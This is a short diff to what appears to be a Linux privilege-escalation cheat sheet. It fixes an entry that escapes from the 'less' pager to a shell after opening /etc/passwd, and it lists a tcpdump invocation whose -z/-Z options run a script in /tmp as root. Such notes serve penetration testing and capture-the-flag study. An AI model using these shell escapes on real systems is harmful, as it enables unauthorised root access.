@@ -78,8 +78,8 @@ Bash
 - uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)
 
 LESS
-- ess /etc/passwd
-- !/bin/sh
+- less /etc/passwd
+- !/bin/bash (inside)
 
 TCPDUMP
 - tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root”
